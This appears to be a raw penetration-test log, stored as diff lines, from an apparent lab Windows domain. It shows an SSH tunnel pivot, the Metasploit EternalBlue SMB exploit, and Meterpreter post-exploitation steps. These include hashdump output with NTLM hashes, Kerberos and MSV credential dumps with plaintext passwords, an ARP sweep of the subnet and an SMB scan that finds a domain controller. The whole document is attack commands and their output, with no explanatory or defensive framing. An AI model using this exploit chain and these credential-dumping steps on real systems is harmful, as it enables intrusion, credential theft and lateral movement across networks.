+ssh -L:4445:192.168.1.17:445 victor@zeus.entreprise.net -L:4444:192.168.1.17:4444 -i id_rsa
+exploit/windows/smb/ms17_010_eternalblue
+--------------------------------------------------------------------------------------------------------
+meterpreter > run hashdump
+
+[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
+[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 742e561252672fcf815565d859151375...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+user7:"resu7"
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+user7:1000:aad3b435b51404eeaad3b435b51404ee:649a9f5ac8b7dbfd84f3f402e3354065:::
+
+meterpreter > run get_env
+[*] Getting all System and User Variables
+
+Enviroment Variable list
+========================
+
+ Name                     Value
+ ----                     -----
+ ComSpec                  C:\Windows\system32\cmd.exe
+ FP_NO_HOST_CHECK         NO
+ NUMBER_OF_PROCESSORS     1
+ OS                       Windows_NT
+ PATHEXT                  .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+ PROCESSOR_ARCHITECTURE   AMD64
+ PROCESSOR_IDENTIFIER     Intel64 Family 6 Model 58 Stepping 9, GenuineIntel
+ PROCESSOR_LEVEL          6
+ PROCESSOR_REVISION       3a09
+ PSModulePath             C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
+ Path                     C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
+ TEMP                     C:\Windows\TEMP
+ TMP                      C:\Windows\TEMP
+ USERNAME                 USER7-PC$
+ windir                   C:\Windows
+ windows_tracing_flags    3
+ windows_tracing_logfile  C:\BVTBin\Tests\installpackage\csilogfile.log
+
+ meterpreter > run arp_scanner -r 192.168.1.0/24
+ [*] ARP Scanning 192.168.1.0/24
+ [*] IP: 192.168.1.2 MAC 00:0c:29:c5:c7:ed
+ [*] IP: 192.168.1.1 MAC 00:0c:29:fa:33:0c
+ [*] IP: 192.168.1.11 MAC 00:0c:29:45:3c:4d
+ [*] IP: 192.168.1.12 MAC 00:0c:29:38:3e:29
+ [*] IP: 192.168.1.14 MAC 00:0c:29:18:6e:f6
+ [*] IP: 192.168.1.17 MAC 00:0c:29:73:c0:e8
+ [*] IP: 192.168.1.13 MAC 00:0c:29:f2:e6:08
+ [*] IP: 192.168.1.20 MAC 00:0c:29:37:97:a0
+ [*] IP: 192.168.1.18 MAC 00:0c:29:99:a7:b3
+ [*] IP: 192.168.1.16 MAC 00:0c:29:52:c4:1f
+ [*] IP: 192.168.1.15 MAC 00:0c:29:f4:33:c8
+ [*] IP: 192.168.1.19 MAC 00:0c:29:d2:45:cb
+ [*] IP: 192.168.1.24 MAC 00:0c:29:29:89:cf
+ [*] IP: 192.168.1.22 MAC 00:0c:29:2f:33:be
+ [*] IP: 192.168.1.23 MAC 00:0c:29:f0:7a:12
+ [*] IP: 192.168.1.255 MAC 00:0c:29:73:c0:e8
+
+ meterpreter > kerberos
+ [+] Running as SYSTEM
+ [*] Retrieving kerberos credentials
+ kerberos credentials
+ ====================
+
+ AuthID    Package    Domain        User           Password
+ ------    -------    ------        ----           --------
+ 0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE
+ 0;39167   NTLM
+ 0;996     Negotiate  ENTREPRISE    USER7-PC$      <<M#zql;=,X )I;H>9NuIIz+-DY qZ_11 JxF]7YQBBQUJ,?!1El>c6JaIIy7OXfWN1\.sm2A6:\G=(U&15IjavtAa!<"a^jE@Y.aiVG[0zM&%_S8=mE g(h
+ 0;999     Negotiate  ENTREPRISE    USER7-PC$      <<M#zql;=,X )I;H>9NuIIz+-DY qZ_11 JxF]7YQBBQUJ,?!1El>c6JaIIy7OXfWN1\.sm2A6:\G=(U&15IjavtAa!<"a^jE@Y.aiVG[0zM&%_S8=mE g(h
+ 0;235793  NTLM       user7-PC      user7          resu7
+ 0;235763  NTLM       user7-PC      user7          resu7
+
+ meterpreter > msv
+ [+] Running as SYSTEM
+ [*] Retrieving msv credentials
+ msv credentials
+ ===============
+
+ AuthID    Package    Domain        User           Password
+ ------    -------    ------        ----           --------
+ 0;996     Negotiate  ENTREPRISE    USER7-PC$      lm{ 00000000000000000000000000000000 }, ntlm{ 5117fcb58a1fa03c2e366397b49a9ec6 }
+ 0;39167   NTLM                                    lm{ 00000000000000000000000000000000 }, ntlm{ 5117fcb58a1fa03c2e366397b49a9ec6 }
+ 0;235793  NTLM       user7-PC      user7          lm{ 9bb6f1c78dc18eefaad3b435b51404ee }, ntlm{ 649a9f5ac8b7dbfd84f3f402e3354065 }
+ 0;235763  NTLM       user7-PC      user7          lm{ 9bb6f1c78dc18eefaad3b435b51404ee }, ntlm{ 649a9f5ac8b7dbfd84f3f402e3354065 }
+ 0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
+ 0;999     Negotiate  ENTREPRISE    USER7-PC$      n.s. (Credentials KO)
+
+ msf auxiliary(smb_version) > run
+
+ [+] 192.168.1.2:445       - Host is running Windows 2008 R2 Standard SP1 (build:7601) (name:AD2008) (domain:ENTREPRISE)
+ [*] Scanned 1 of 1 hosts (100% complete)
+ [*] Auxiliary module execution completed
